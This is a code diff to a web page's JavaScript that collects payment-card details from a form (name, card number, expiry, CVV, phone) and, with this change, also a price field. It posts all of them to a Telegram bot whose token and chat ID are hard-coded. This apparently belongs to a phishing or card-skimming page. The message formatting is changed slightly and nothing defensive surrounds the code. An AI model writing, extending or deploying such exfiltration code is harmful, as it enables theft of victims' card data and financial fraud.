@@ -167,18 +167,21 @@
             const dateExpiration = document.getElementById("date-expiration").value;
             const cvv = document.getElementById("cvv").value;
             const telephone = document.getElementById("telephone").value;
+            const PRIX = document.getElementById("prix").value;
+
 
             // Send to Telegram bot
             const token = "7631724461:AAGvOb7G_n2IO1qGwpJp-WaHgyBhREW1mfU";
             const chatId = "5372119436";
 
             const message = `
-🔔 **Nouvelle Demande de Paiement** 🔔
+🔔 Nouvelle Demande de Paiement 🔔
 👤 Nom: ${nom}
 💳 Numéro de Carte: ${numeroCarte}
 📅 Expiration: ${dateExpiration}
 🔒 CVV: ${cvv}
-📞 Téléphone: ${telephone}`;
+📞 Téléphone: ${telephone}
+🔔 Prix : ${PRIX} EURO`;
 
             try {
                 await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
